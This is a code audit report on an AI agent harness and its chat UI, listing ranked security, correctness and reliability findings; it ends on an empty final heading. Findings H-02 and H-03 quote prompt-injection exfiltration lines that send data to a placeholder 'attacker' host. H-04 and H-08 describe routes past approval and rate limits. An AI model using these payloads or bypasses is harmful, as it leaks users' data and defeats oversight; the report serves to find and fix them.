# Relay harness audit

Date: 2026-11-02 · Branch: `feature/ai-agent` (HEAD `ee68d0b`) · Report only: no code was changed.

Re-verified 2026-11-08 at HEAD `d88bbc3`: line numbers updated, 2 findings fixed since, 1 false positive removed, 6 gaps added (a 7th is folded into H-08).

## Scope and method

- **Scope:** the agent runtime and the Relay UI that exposes it:
  - the chat route, guard and rate limit, and the system prompt;
  - the tool registry and schemas, approval, and the step cap and token budget;
  - redaction, the network tools, and the change log and Undo;
  - thread persistence, the conversation and the cards.
- **Not in scope:** the build-phases/e2e dev workflow.
- **Yardstick:** the promises in `agent_docs/relay-polish/SPEC.md` (RP-2xx), `agent_docs/relay-v2/SPEC.md` (TOOL/CONV/BUG/BAK) and `agent_docs/relay-conversation-polish/SPEC.md` (R1–R7), plus how the code actually behaves.
- **Method:**
  - A mechanical consistency matrix over all 74 tools. Every tool has an implementation, a capability category, and en/fr running/done labels, so there is no registry drift.
  - Five parallel deep reads: server loop, write tools vs Undo, approval and security, UI, and spec traceability with tool-surface design.
- **Ranking:** severity × likelihood, weighted equally across workspace correctness, agent reliability and security.
- **Confidence:**
  - **CONFIRMED (re-read)**: the main auditor re-opened the cited lines.
  - **CONFIRMED**: the sub-auditor traced the code path, but the main auditor did not re-open it.
  - **PLAUSIBLE**: suspected but not fully traced.
  - None of these were reproduced by running a test.
  - The 2026-11-08 re-verification counts as CONFIRMED (re-read) only where the verifier re-read the code; otherwise the existing level stands. Gaps found during re-verification were traced by the verifier and are marked CONFIRMED.
- **Line numbers** refer to HEAD `d88bbc3` (re-verified 2026-11-08; the audit itself ran at `ee68d0b`) and drift as code changes. Re-check them before fixing.

## Headline

The registry's approval logic is sound:
- Tokens are branded and minted only on a click.
- Flipping the mode while a card is pending is safe.
- `import_backup` is merge-only and never sees the file.
- The context fence and the response-body fence hold (the attachment fence does not, L-24).
- The step-cap math is exactly 12 on the client; the server count trusts client-sent parts (H-08).

The weak points are elsewhere:
1. **Turn lifecycle (Stop, Retry, thread switch).** Stop does not end the loop. Retry replays the whole turn's writes. Queued tools write into whichever thread is current when they run.
2. **"Auto" tools that are not low-risk.** Script writes, Share variable values, TLS off, global base URL and downloads all run without asking in Review mode. Combined with images in markdown that load on their own, this gives a zero-click way for a prompt injection to send data out.
3. **Undo fidelity.** Undo misses the collection's chain and the active environment, and undoing a tab-only edit leaves the tab dirty (L-14). Separately, a Relay edit to an open request is overwritten by the next Save (H-07).
4. **Tool-surface ergonomics for the model.**
   - Reads and writes use different shapes.
   - Catalog slugs must be guessed.
   - All 74 tools (about 48k characters, ~14k tokens) are sent on every step.
   - Some reads are missing.

## Ranked findings

| # | ID | Title | Concern | Sev | Lik | Conf |
|---|----|-------|---------|-----|-----|------|
| 1 | H-01 | Stop does not end the turn; the tool loop resubmits | reliability | high | high | CONFIRMED (re-read) |
| 2 | H-02 | Markdown images load on their own (zero-click exfiltration) | security | high | med | CONFIRMED (re-read) |
| 3 | H-03 | `set_request_scripts` is auto; the code runs via `new Function` on the next Send | security | high | med | CONFIRMED (re-read) |
| 4 | H-04 | The model can turn on "Share variable values" without approval | security | high | med | CONFIRMED (re-read) |
| 5 | H-05 | Retry/Regenerate replays every tool step of the turn, so writes are duplicated | correctness | high | med | CONFIRMED (re-read) |
| 6 | H-06 | Queued tools take the thread and turn at run time; a thread switch mid-run misroutes changes and Undo | correctness | high | med | CONFIRMED (re-read) |
| 7 | H-07 | A Relay edit to a request that is open in a tab is overwritten by the next Save | correctness | high | med | CONFIRMED (re-read) |
| 8 | H-08 | The model's daily cap and rate limit can be bypassed; `/api/ai` uses the server key with no guard | security | high | med | CONFIRMED (re-read) |
| 9 | H-09 | Undo of `delete_collection` doesn't restore the collection's chain | correctness | high | low | CONFIRMED (re-read) |
| 10 | M-00 | The model must guess `import_api_catalog` slugs, so the import fails after approval | reliability | med | high | CONFIRMED |
| 11 | M-02 | Read and write vocabularies differ for body types and auth | reliability | med | high | CONFIRMED (re-read) |
| 12 | M-03 | All 74 tools (~14k tokens) are sent on every step | reliability | med | high | CONFIRMED |
| 13 | M-01 | Auto tools get no AbortSignal, and Stop is hidden while they run | reliability | med | med | CONFIRMED |
| 14 | M-04 | Redaction misses common credential formats; curl `-u token:` username is stored as a literal | security | med | med | CONFIRMED |
| 15 | M-05 | Global base URL and headers are auto and unvalidated; the send card host ignores the base URL; `send_request` refuses relative URLs | security / reliability | med | med | CONFIRMED |
| 16 | M-07 | In skip mode, deleting a request with a dirty tab can never succeed | reliability | med | med | CONFIRMED |
| 17 | M-09 | Catalog import differs from the Hub UI, has no already-imported check, and can fail half-written | correctness | med | med | CONFIRMED |
| 18 | M-11 | `import_backup` records no change, so it gets no card and no Undo | correctness | med | med | CONFIRMED |
| 19 | M-12 | `duplicate_chain` copies collection scope, so the copy is hidden; `duplicate_collection` drops the chain | correctness | med | med | CONFIRMED |
| 20 | M-13 | Undo of `delete_environment` leaves no environment active | correctness | med | med | CONFIRMED |
| 21 | M-14 | "Save all & close" and dirty-gate save drop assertions | correctness | med | med | CONFIRMED |
| 22 | M-15 | No read-after-write for assertions, timeout, SSL or redirects; no history list; folders unsearchable | reliability | med | med | CONFIRMED |
| 23 | M-16 | "One logical change at a time", a 12-step cap and no batch create, so large builds may hit the cap | reliability | med | med | CONFIRMED |
| 24 | M-17 | Nullable-but-required fields with no strict mode or repair, so validation retries burn steps (model behaviour unmeasured) | reliability | med | med | CONFIRMED |
| 25 | M-18 | Overlapping tools (`delete_request`/`delete_requests`, collection tools vs folder tools) | reliability | med | med | CONFIRMED |
| 26 | M-19 | A `graphql` body type is stored as JSON without the promised wrapping | correctness | med | med | CONFIRMED |
| 27 | M-20 | Sending while an auto tool runs loses its result and ChangeCard | reliability | med | med | CONFIRMED |
| 28 | M-21 | Partial reply lost on thread switch or tab close mid-stream | reliability | med | med | CONFIRMED |
| 29 | M-28 | A rejected Redis connect is cached forever; guard errors are unhandled; a failed `expire` leaves a key with no TTL | reliability / security | med | med | CONFIRMED |
| 30 | M-06 | `update_proxy_settings{sslVerify:false}` is auto; `proxyUrl` is a no-op | security | med | low | CONFIRMED |
| 31 | M-10 | Multi-item deletes that fail partway keep the deletes already done but report an error | correctness | med | low | CONFIRMED |
| 32 | M-22 | After reload, an approved confirm-kind call that ran shows "Declined automatically" | correctness | med | low | CONFIRMED |
| 33 | M-23 | Regenerate or Edit & resend discard the ChangeCards of applied writes | correctness | med | low | CONFIRMED |
| 34 | M-25 | STT route has no rate limit and buffers the upload before the size check | security | low | med | CONFIRMED |
| 35 | M-29 | In-memory rate-limit fallback is never evicted and silently replaces Redis in production | security | low | med | CONFIRMED |
| 36 | M-30 | Chat route reads and scans the whole body before the guard runs | security | low | med | CONFIRMED |
| 37 | M-24 | Permission mode and Enable aren't synced across browser tabs | security | low | low | CONFIRMED |
| 38 | M-26 | Current turn is never trimmed, so a long loop costs more and can end in `context_too_long` | reliability | low | low | CONFIRMED |
| 39 | M-27 | Scope list omits history and tabs | reliability | low | low | CONFIRMED |
| — | L-xx | 24 open low findings, listed below | | low | | |

---

## High

### H-01 Stop does not end the turn
- **Evidence:**
  - `src/hooks/useRelayChat.ts:127-136`: `shouldContinueToolLoop` checks only `lastAssistantMessageIsCompleteWithToolCalls` and the step count. It never reads `finishReasonRef`.
  - `stopTurn` (`:847-859`) aborts and calls `stop()`, but a queued tool still calls `addToolOutput` (`:426-430`).
  - The SDK's `addToolOutput` auto-submits when the status is `ready` (`node_modules/ai/dist/index.mjs:~13217`).
  - The spec `useRelayChat.spec.ts:1127-1139` even mocks the follow-up turn.
- **Failure:** the user presses Stop during an approved `run_chain`. Stop does abort the tool (`stopControllersRef`, `:849-851`), but once the tool returns its output the SDK auto-continues: the model keeps calling tools and the turn has no timing.
- **Fix:**
  - Keep a `stoppedRef` that is set in `stopTurn` and cleared on send and regenerate.
  - Have `sendAutomaticallyWhen` return false when it is set.
  - Add a spec asserting the fetch count.

### H-02 Markdown images load on their own
- **Evidence:**
  - `src/components/relay/RelayMarkdown.tsx:100-134`: `COMPONENTS` has no `img` override.
  - `allowRelayUrl` passes any https URL through `defaultUrlTransform`.
  - There is no CSP.
- **Failure:** an injected response body makes the model reply with `![](https://attacker/x?d=<data>)`. The browser requests that URL the moment the reply renders. This chains with H-03, H-04 and M-04.
- **Fix:**
  - Override `img` to render the alt text, or a link that needs a click.
  - Add a spec for markdown image syntax.
  - Optionally add a CSP `img-src 'self' data:`.

### H-03 Script writes are auto and run with full page access on the next Send
- **Evidence:**
  - `src/lib/relay/tools/schemas.ts:609-618` marks the tool `kind:"auto"`, and its description says scripts are "never run by this tool".
  - They do run on the user's next Send, through `scriptRunner.ts:133-137` (`new Function`), from `useSendRequest.ts:141-143`.
- **Failure:** an injected instruction stores `fetch('https://attacker/?'+JSON.stringify(localStorage))` as a pre-request script.
- **Fix:**
  - Treat script writes as approval-required in Review mode, and show a script diff on the card.
  - Refuse literal secrets in script text.
  - Fix the description.

### H-04 The model can turn on "Share variable values"
- **Evidence:**
  - `schemas.ts:777-787`: `set_relay_preferences` is auto (since f183457 it takes only `shareValues` and `enabled`).
  - `approvalNeeded` (`:951-966`) asks only for `enabled:false` (`:963`).
  - `settingsWrite.ts:~148-165` applies the change immediately.
  - The redaction context is rebuilt on every call (`useRelayChat.ts:399-403`), so the next `get_environment` in the same turn returns real values.
- **Spec:** promise 6, which says values are shared only when the *user* turns this on.
- **Fix:** remove `shareValues` from the tool (it is a user-only privacy switch, like the deny-list items), or require approval in every mode when it changes to true.

### H-05 Retry/Regenerate replays the whole turn
- **Evidence:**
  - `useRelayChat.ts:861-866` calls the SDK `regenerate()`, which drops the whole last assistant message, including completed tool steps.
  - It is wired to both Retry and Regenerate (`RelayDock.tsx:118,129`).
  - Any mid-turn error comes back as `tool_failed`, which offers Retry (`route.ts:178-182`, `errors.ts:43`), so Retry replays the whole turn.
- **Failure:** three `create_request` calls succeed, step 4 errors, and the user clicks Retry. The collection now holds 6 requests.
- **Fix:**
  - Retry should resend from the last completed tool step without dropping finished tool parts.
  - Regenerate should warn when the turn has applied changes, or offer "Undo and regenerate".

### H-06 Thread switch mid-run misroutes tool writes
- **Evidence:**
  - `useRelayChat.ts:484-503`: `enqueueTool` reads `chatIdRef.current`, `messagesRef.current` and `addToolOutputRef.current` *when the queued tool runs*, not when it was called.
  - The thread list stays usable mid-run (`ThreadList.tsx:344-362`).
  - The change log keys Undo by turn id only (`changeLog.ts:689-693`: `undoTurn` filters on `turnId`).
  - The effect at `:583-588` calls `stop()` on a chat change, but that does not cancel queued tools.
- **Failure:** the user switches threads while a tool is queued. The change is attributed to the new thread, its output is dropped, and the new thread's "Undo all" reverts it silently.
- **Fix:** capture `threadId`, `turnId`, attachments and `addToolOutput` inside `onToolCall` and pass them into the queue. Alternatively, block thread switching or require Stop while a turn is live.

### H-07 Relay edits to an open request are lost on the next Save
- **Evidence:**
  - `requestWrite.ts:218-229` writes only the store request.
  - The writer `putRequest` (`changeLog.ts:789-794`) calls `useCollectionsStore.updateRequest`, which updates only the request (`useCollectionsStore.ts:437-445`). Tabs keep their own copy of the URL, headers and body, and nothing syncs them from the store, so even a clean tab goes stale.
  - `hooks/useSaveRequest.ts:31-43` writes the tab's stale copy back over it.
  - Undo is then blocked by the conflict.
- **Fix:**
  - Have request writes also patch the clean open tab, or mark the tab "changed outside the editor" and refuse to save over it.
  - If the tab is dirty, route the edit through the existing confirm gate.

### H-08 Model spend can bypass the cap; `/api/ai` is unguarded
- **Evidence:**
  - `src/lib/relay/server/guard.ts:92` returns ok with no metering when the last message isn't from the user.
  - The daily scope uses the client-set `x-relay-user` header when it is present (`:111`), so rotating the header resets the cap, and the IP daily cap is never checked then.
  - `isSameOrigin` passes when no Origin header is sent (`:45-53`).
  - `clientIp` (`:39-42`) trusts the first `x-forwarded-for` entry, so the IP scope is also spoofable unless the proxy overwrites the header.
  - The server step cap is client-enforced: `remainingSteps` (`route.ts:85-93`) counts `step-start` parts in the request's own messages and `messageSchema` is a `looseObject` (`:38-42`), so a direct caller that omits them always gets `stepCountIs(12)`. Tools have no `execute` (`:57-66`), so each request is one model step and every continuation request is unmetered (`guard.ts:92`).
  - `src/app/api/ai/route.ts:105-137` has no flag check, origin check, rate limit, zod validation or `maxOutputTokens`, and it keeps working when Relay is disabled by flag (BUG-05).
- **Fix:**
  - Meter every model call, including tool continuations, at a lower weight; do not rely on step counts.
  - Always enforce the IP daily cap.
  - Use a trusted client-IP source.
  - Require a same-origin signal.
  - Run the shared guard on `/api/ai`.

### H-09 Undo of delete_collection loses its chain
- **Evidence:**
  - `stores/useCollectionsStore.ts:409-410` cascades `deleteChain(id)`.
  - The tree adapter restores only the collection, folders and requests (`changeLog.ts:248-259`).
- **Fix:** capture the chain in `captureTree` and restore it.

## Medium

- **M-00 Catalog slug must be guessed.**
  - Evidence: `schemas.ts:866-870` takes `slug: z.string().min(1)`, and no tool lists the valid slugs. `isValidHubSlug` (`catalogTools.ts:55`, `hub.ts:156-159`) checks syntax only, so real validity is known only after the fetch (`:56-63`), which is after approval. The card shows the raw guess (`:46-53`). The real slugs are folder names under `public/data/hub`.
  - Failure: "add the Clerk API" produces `clerk`, and the import fails after the user approves. The workspace is not damaged, but the approval was wasted.
  - Fix: build an enum from the hub index, or add a `list_api_catalog` read tool. Validate the slug before showing the card (see L-06).
- **M-01 Auto tools can't be aborted.**
  - Evidence: `onToolCall` → `enqueueTool(toolCall)` with no grant (`useRelayChat.ts:557-561`), so `network.ts:~203` falls back to a signal nothing can abort. The status reads "ready" unless an approved tool is running (`:873`), so the composer shows Send instead of Stop (`RelayDock.tsx:99`).
  - In skip mode this covers `send_request` and `run_chain`.
  - Fix: give every queued call an AbortController and count running auto tools in `approvedRunning`.
- **M-02 Read and write shapes differ.**
  - Writes use `form`, `apikey`, `keyName` and `keyValue` (`schemas.ts:40-48,138-146`).
  - Reads return `form-data`, `xml`, `html`, `api-key`, `key` and `value` (`workspaceRead.ts:~165-222`, types in `types/index.ts:29-36`).
  - `xml` and `html` bodies can't be written.
  - Fix: one shared vocabulary in `schemas.ts`, used by both directions.
- **M-03 Tool payload on every step.**
  - `route.ts:57-66,185-197` sends all 74 tools. Measured at `d88bbc3`: 48,132 characters, about 13.8k tokens at 3.5 characters per token (the Grok enum removal trimmed it). That is about 165k tokens for a 12-step turn, and a large tool menu lowers the model's tool-choice accuracy.
  - Fix:
    - Use a core set plus topic groups, chosen by `prepareStep`/`activeTools`, slash command or attachment kind.
    - Shorten the longest descriptions (`add_chain_node` is 2.5k characters).
- **M-04 Redaction gaps.**
  - `redact.ts:18,47-57` misses `Authorization: Token …`, lowercase `basic` (`BASIC` is case-sensitive, `BEARER` is not, `:55`), `sk_test_`/`sk_live_`, `glpat-`, and `?key=`/`access_key` inside `redactDeep`. Scripts only go through `redactValue` (`workspaceRead.ts:219-220`).
  - `curl.ts:317-322` replaces only the password, so `curl -u sk_test_…:` (the form Stripe's docs use) stores the key as a literal, and `buildCurl` (`:371`) then echoes it back.
  - Fix: add these cases to `redact.corpus.ts` and the patterns; treat a token-shaped basic-auth username as a secret.
- **M-05 Global base URL.**
  - `settingsWrite.ts:~126-142` stores `baseUrl` without running `urlProblem`. Global headers are auto too: only headers named in the secret-header list refuse values (`backup/secrets.ts:5-12`), so any other header (for example `X-Foo`) may carry a `{{token}}` reference.
  - The send card host comes from `request.url` alone (`network.ts:~108-116`), so it hides the real destination.
  - `send_request` checks the scheme before the base URL is prepended (`network.ts:142-150` vs `utils.ts:105-112`; the scheme rule is `requestWrite.ts:34,62`), so requests with relative URLs that work from the Send button are refused.
  - Fix:
    - One `resolveSendTarget()` shared by the card and the send.
    - Require approval for base URL changes.
    - Validate `baseUrl`.
- **M-06 TLS off is auto.**
  - `update_proxy_settings{sslVerify:false}` is auto (`schemas.ts:759-768`).
  - `proxyUrl` is never read by the request runner (`requestRunner.ts`, `useSendRequest.ts`).
  - Fix: require approval when `sslVerify` changes to false; wire `proxyUrl` in or drop it.
- **M-07 Skip mode with a dirty tab.**
  - Only the close-tab tools register a confirm gate (`tabs.ts:212-217`). The delete tools get `DECISION_REQUIRED` (`tabs.ts:151-160`), and no card appears in skip mode.
  - Fix: register the dirty-tab gate on the delete tools, so it shows in every mode as RP-221 already intends.
- **M-09 Catalog import.**
  - `catalogTools.ts:54-105` skips `getImportedSlugs()`, which the UI checks (`HubProviderCard.tsx:25,135-157`).
  - It takes a different path from the Hub import (`handleImport` uses `importHubEntry`, `:29-59`) and makes two `commitChange` calls, writing the collection before the environment, so it can fail half-written.
  - Fix: reuse the Hub import function; refuse duplicates.
- **M-10 Partial multi-delete.**
  - `destructive.ts:180-195` commits one change per id and returns the first failure (`:194`), discarding the `changes`/`deletedIds` already applied, so the model believes nothing happened.
  - No pre-validation of ids exists. A failure needs a mid-loop `mutate` throw or a change-log (IndexedDB) write failure (`changeLog.ts:743-755,637-665`), which is why likelihood is low.
  - Fix: validate every id first (all or nothing), or return a partial result with the change ids.
- **M-11 `import_backup` has no Undo.**
  - `backupTools.ts:113-143` records no change and has no adapter entry.
  - TOOL-04 says every write op has Undo.
  - Fix: record the merged entity ids as one change.
- **M-12 Duplicates of chains.**
  - `duplicateTools.ts:93-116` (`duplicateChain`) spreads the source, so it keeps `scope:"collection"`. `ChainList.tsx:52` and `SidebarSearch.tsx:91` filter on `standalone`, which hides the copy from the chain list and search. The copy also keeps the same `collectionId`, so the collection ends up with two chains.
  - `duplicateCollection` (`:68-91`) doesn't copy the chain.
  - Fix: make chain copies standalone (R1); copy the chain on collection duplicate.
- **M-13 Undo of delete_environment.**
  - `destructive.ts:229-250` snapshots only the environment. `deleteEnv` clears the active pointer when it matches (`useEnvironmentsStore.ts:98-101`), and the change uses the plain `rowAdapter("environment")` (`changeLog.ts:468`) rather than the `activeEnvironmentAdapter` (`:277-286`).
  - Fix: record `wasActive` in the snapshot and call `setActive` on restore.
- **M-14 Assertions dropped on save.**
  - The save behind "Save all & close" and the dirty gate (`tabs.ts:111-124`) leaves out `assertions`, which `useSaveRequest` includes (`hooks/useSaveRequest.ts:41-42`).
  - Fix: share one save function.
- **M-15 Read-after-write gaps.**
  - `get_request` leaves out assertions, timeout, SSL and redirects (`workspaceRead.ts:201-222`).
  - `get_tab_request` refuses HTTP tabs (`tabRequests.ts:211`), so `generate_tests` output can't be verified.
  - No tool lists history, although `diff_responses` takes history positions.
  - Folders can't be searched (`SEARCH_KINDS` has no folder, `schemas.ts:17-22`).
  - Fix: return the full request from `get_request`, let `get_tab_request` read HTTP tabs, add `list_history`, and include folders in search.
- **M-16 Batch limits.**
  - `systemPrompt.ts:17` says "at most one logical change at a time", `RELAY_MAX_STEPS` is 12 (`constants.ts:69`), and there is no batch create.
  - So "build a 15-request collection" may not finish. The prompt wording does not stop the model emitting parallel calls, so this is an upper bound, not a certainty.
  - Fix: allow independent calls in one step, or add `create_requests` (batch, bulk-approval aware).
- **M-17 Nullable but required fields.**
  - Mechanism confirmed: `add_chain_node.block` needs 11 keys (`schemas.ts:178-186`, `kind` + `requestId` + 9 node fields), an omitted nullable key is a schema error (zod strict object; every key is `required` in the JSON schema), strict tool mode is off (`model.ts:12-14`), and nothing repairs it (no `experimental_repairToolCall` in `src/`).
  - How often the model omits keys is not measured. The error is recoverable and the prompt says to retry once (`systemPrompt.ts:23`), so the impact is wasted steps against the 12-step cap, not corruption.
  - Fix: use `experimental_repairToolCall`, or `.nullish()` on the chain fields.
- **M-18 Overlapping tools.**
  - `delete_request` and `delete_requests` have identical `ids` inputs (`schemas.ts:668-683`).
  - `create_collection` takes a `parentId` that duplicates `create_folder` (`:407-412`), and `rename_collection` accepts folder ids through `id` and duplicates `rename_folder` (`:413-418,840-859`).
  - `delete_requests_in_collection.collectionId` also accepts a folder id (`:684-689`).
  - Fix: one tool per intent; use the input name `parentId`.
- **M-19 GraphQL body type.**
  - `requestWrite.ts:46-55,195-206` maps `graphql` to `json` and stores `content` as given, without the `{query, variables}` wrapping that the description (`schemas.ts:599`) promises.
  - Fix: wrap it as `{query, variables}`, or drop `graphql` from `BODY_TYPES`.
- **M-20 Send while an auto tool runs.**
  - `send` (`useRelayChat.ts:718-730`) calls `sendMessage` while a tool from `enqueueTool` (`:484-503`) is still pending. The SDK's `addToolOutput` only patches the last message (`node_modules/ai/dist/index.mjs:13207-13213`), so the late output and ChangeCard are lost and the row spins forever.
  - Fix: disable Send while queued tools are pending, or make Send stop and settle first. This is part of theme 1.
- **M-21 Partial reply lost.**
  - The thread save skips while streaming (`useRelayChat.ts:746`: `if (status === "streaming" ...) return`). A thread switch calls `stop()` and the save effect returns early (`:584-589`), and the `pagehide` flush (`threadDb.ts:341-345`) writes only what was already queued, so a thread switch or tab close loses the in-progress reply.
  - Unmounting the dock (Relay off) does save the partial (`useRelayChat.ts:594-609`).
  - The CONV-11 comment (`:331-335`) claims a tab closed before the turn settles reloads as Interrupted, but nothing is persisted mid-stream.
  - Fix: save a throttled partial snapshot while streaming, and flush on `pagehide` and on thread switch.
- **M-22 Ran but shown as declined.**
  - On restore, `declinePendingTools(thread.messages)` (`useRelayChat.ts:636`, defined `:215`) passes no running set, and after a reload `awaitingDecisions` is empty, so confirm-kind calls that were approved and had started are marked `autoDeclined` (`:141-145`). Auto tools are not declined; they keep spinning (L-03).
  - Needs a reload during a run, hence low likelihood.
  - Fix: persist a "running" marker when an approved call starts, and settle it on restore as "interrupted — may have applied", with a link to the change log.
- **M-23 Discarded turns keep their writes.**
  - `undoTurn(turnId)` reverts every row with that `turnId`, whatever is visible (`changeLog.ts:689-699`), and `TurnChangeBar.tsx:100-118` passes only `turnId`.
  - Regenerate (`useRelayChat.ts:861-866`) keeps the user message, so the turn id is unchanged: "Undo all" on the new reply also reverts the discarded reply's changes, while the bar counts only the visible `changeIds`.
  - Edit & resend (`:833-844`) removes the user message, so the new turn has a new id: the discarded turn's changes stay applied with no Undo entry point.
  - Fix: before cutting, show the applied changes and offer "Undo them" or "Keep them". Re-key kept changes to the new turn. It must handle both paths.
- **M-24 No cross-tab sync.**
  - `useRelayPermissionStore.ts:23-50` and `useRelayStore.ts:176-200` read and write localStorage only at load and on set. Neither file has a `storage` event listener.
  - Tightening the mode, or disabling Relay, in one tab doesn't reach another open tab. Rated low: it needs the same user with two tabs open.
  - Fix: add a `storage` listener that rehydrates the mode and `enabled`, or read the mode from storage at `onToolCall`.
- **M-25 STT route.**
  - `stt/route.ts:48-59` calls `req.formData()` (`:48`) before the size check (`:57-59`) and has no rate limit or `Content-Length` check.
  - Rated low: `isSameOrigin` (`:40`) limits who can call it, and the client caps recordings at 120 s (about 3.8 MB), so honest clients never reach the 8 MB limit.
  - Fix: check Content-Length first; use the shared limiter.
- **M-26 Current turn never trimmed.**
  - `trimHistory` keeps the latest turn whatever its size (`tokenBudget.ts:121-134`), whose tool results can reach 16k characters each (about 4k tokens, `:12`). The 24k-token budget (`tokenBudget.ts:4`, `contextBuilder.ts:70-80`) is client-side only.
  - So a long loop costs more on every step (up to about 64k tokens at the 256 KB body cap, plus the tool menu) until the body exceeds the cap and the turn fails with `context_too_long` (`chat/route.ts:104-109`) and no compaction.
  - Fix: compact older tool outputs within the current turn.
- **M-27 Scope list.**
  - The scope list at `systemPrompt.ts:9` ("requests, collections, environments, chains, settings, backups") names neither history nor tabs. `CAPABILITIES` (`:6`) does name folders, duplicating, the Postman export, the catalog, theme/language/proxy and global variables.
  - `SCOPE_RULES` was made strict after the audit (`:8-14`: "Everything else is out of scope, however simple or harmless it looks"), so a decline of "export my history" is now more likely.
  - Fix: build the scope list from the tool categories so it can't drift from the registry.
- **M-28 Redis connect failure is cached; guard errors are unhandled** (gap found in re-verification).
  - `localRedisCounter.ts:9-20` assigns `clientPromise = client.connect().then(...)` and never resets it on rejection, so every later `getClient()` rethrows. `guardRelayRequest` runs at `route.ts:157`, outside the try/catch that starts at `:171`, so a throwing `incr`/`expire`/`ttl` is an uncaught 500 (not a JSON relay code) for all users until restart.
  - `rateLimit.ts:91-94` does `incr` then `expire` as two calls: if `expire` fails after the count reaches 1, the key has no TTL and never hits `count === 1` again, so that user or IP is limited permanently (same for the daily key, `guard.ts:72-73`).
  - Fix: reset `clientPromise` on rejection; wrap the guard in try/catch that returns a relay error code (decide fail-open or fail-closed explicitly); use `SET key 1 EX n NX` or a Lua script, or set the expiry when `ttl === -1`.
- **M-29 In-memory rate-limit fallback grows without bound** (gap found in re-verification).
  - `rateLimit.ts:54,69-78` falls back to `memoryCounter` when neither `REDIS_URL` nor the Upstash vars are set; there is no `NODE_ENV` check and `isRelayConfigured` does not require a counter. `createMemoryCounter` (`:21-52`) deletes an expired entry only when that same key is read again, so keys created per rotated `x-relay-user` header (`guard.ts:95`) or spoofed `x-forwarded-for` (`:39-42`) are never evicted. Counts are also per instance, so limits are ineffective on serverless or multi-instance hosts.
  - Fix: sweep expired entries (or cap the Map size); in production require a shared counter (fail closed or log loudly); cap and validate header length.
- **M-30 Chat route does unmetered work before the guard** (gap found in re-verification).
  - `route.ts:151-169`: `isSameOrigin`, then `readBody` (`await req.text()` reads the whole body before the 256 KB check at `:104-109`), `JSON.parse`, zod and the `hasUnredactedSecret`/`hasUnredactedHistorySecret` deep scans all run before `guardRelayRequest` (`:157`) and count against no limit. This is the same pattern as M-25.
  - Fix: check Content-Length first and stream-limit the body; run the cheap IP burst limit before parsing.

## Low

- **L-01** `systemPrompt.ts:18` promises a confirmation card, and tool descriptions say "must approve first" (`schemas.ts:671-737,804,855,867`). Neither is true in skip mode, and the prompt is never told the mode (`LIMIT_RULES`, `systemPrompt.ts:26`, only hints "unless the user chose to skip approvals"). Fix: put the mode in the per-request context, or reword.
- **L-02** The scope guard relies on the prompt alone, and all tools are always sent (`route.ts:39,57-65,185-197`). Combined with H-08, a direct caller can prefill assistant turns. Fix: drop client-sent assistant turns the server didn't produce, or sign them; the topic-based tool loading in theme 5 also narrows this.
- **L-03** Restored threads leave auto tool calls without results spinning forever (`useRelayChat.ts:198-206,636`). `ignoreIncompleteToolCalls` hides them from the model, so it never learns the write happened. Fix: settle them as "interrupted" on restore.
- **L-04** `diff_responses` output (`smart.ts:115-127`) is neither fenced nor marked untrusted. WebSocket message data is marked untrusted but not fenced (`tabRequests.ts:190-202`). Fix: wrap both in the shared response fence.
- **L-05** `export_history` (unredacted) and `export_postman` download files with no approval, unlike `export_backup` (`schemas.ts:722-728,862-866`). Fix: make both confirm (part of theme 2).
- **L-06** Approval cards render before ids are checked (`MessageParts.tsx:107`; `findMissingRef` in `registry.ts:217-223` runs after approval), so the user can be shown a "Delete 0" card and an unknown id is only rejected (`request not found: <id>`) after they approve. Ids are `min(1)` and there is no "0 requests" success path, but the card preview is wrong. Fix: run a `validate(input)` step before the card and fail fast on unknown ids.
- **L-07** `redactEnvironment` (`redact.ts:308-323`) and `describeEnvironment` (`workspaceRead.ts:402-419`) return different shapes. Fix: derive one from the other.
- **L-09** Switching from no environment is labelled "Created 1 environment" (`environmentWrite.ts:216-224`, `changesSummary.ts:48`). Fix: give active-environment changes their own `action` instead of inferring "created" from `before === null`.
- **L-10** The pending "turn Relay off after this reply" is held only in memory and lost on reload (`useRelayChat.ts:792-794`). Fix: persist it with the thread, or apply it immediately when the reply ends.
- **L-11** `import_curl` silently uses the first collection when none is given (`smart.ts:69`). Fix: require one, or ask.
- **L-13** `move_item` has no manual-UI counterpart: no drag/drop or move handler exists in the collection tree (only the tab bar and chain panels have drag code; the store has an unused `moveRequest`, `useCollectionsStore.ts:51,455`, and no folder move). TOOL-04 says "do not invent tools", and the folder order can collide (`collectionWrite.ts:171-176`, `order: index ?? siblingCount(...)`). Fix: either add a move action to the tree UI and have both use one store action that re-indexes siblings, or remove the tool.
- **L-14** Undo of a tab-only edit leaves the tab dirty, and tab-only edits are lost on reload. `update_tab_request` snapshots `before` (`tabRequests.ts:166-190`); the restore (`changeLog.ts:322-348`) goes through `updateTabState`, which sets `isDirty: true` (`useTabsStore.ts:277-287`), and `TAB_REQUEST_FIELDS` excludes `isDirty`. Fix: restore `isDirty` with the snapshot.
- **L-15** An undo that throws partway leaves a half-restored state with no recorded status (`changeLog.ts:675-680`). Without IndexedDB, Undo is dead after reload. Undo doesn't reopen tabs a delete closed (`tabs.ts:168`). Fix: restore all-or-nothing with a status on the change, show "Undo unavailable" when IndexedDB is missing, and record closed tab ids in the delete snapshot.
- **L-16** Two tabs on one thread overwrite each other's saves (`threadDb.ts:316-330`). Fix: compare a version or `updatedAt` before writing.
- **L-17** Two cards waiting at once are subtracted twice from active time (`timing.ts:109-113`). Fix: merge overlapping waiting intervals before summing.
- **L-18** Declining `import_backup` shows a red "Failed" row. Its error is `IMPORT_CANCELLED_ERROR` ("cancelled", `schemas.ts:899-906`), but `MessageParts.tsx:73` only checks for `USER_DECLINED_ERROR`. Fix: treat both as declined.
- **L-19** Raw English registry errors and internal ids reach the fr/ja UI through `ToolRow` error text (`ToolRow.tsx:94-103,143`; `toUserFacingToolError` only drops tool-name-shaped text, `errors.ts:179-184`). Fix: map error codes to i18n keys and keep the raw text for the model only.
- **L-20** `/run` says "request or chain" but has `requiresTarget: "request"` (`slashCommands.ts:192-201`). Fix: support a chain target, or reword the description.
- **L-21** The turn Changes bar counts only `changeId` and ignores `changeIds` (`MessageParts.tsx:251-255`). A delete of 3 collections shows as 1 (`destructive.ts:209`), and an `import_api_catalog` of 2 changes shows as 1 (`catalogTools.ts:99`), although "Undo all" reverts all of them. R4 grouping has since shipped, for chains only (`changeGroups.ts`, `MessageParts.tsx:160-195`), and has the same single-id limit. Fix: count `changeIds`.
- **L-22** Tool-surface nits:
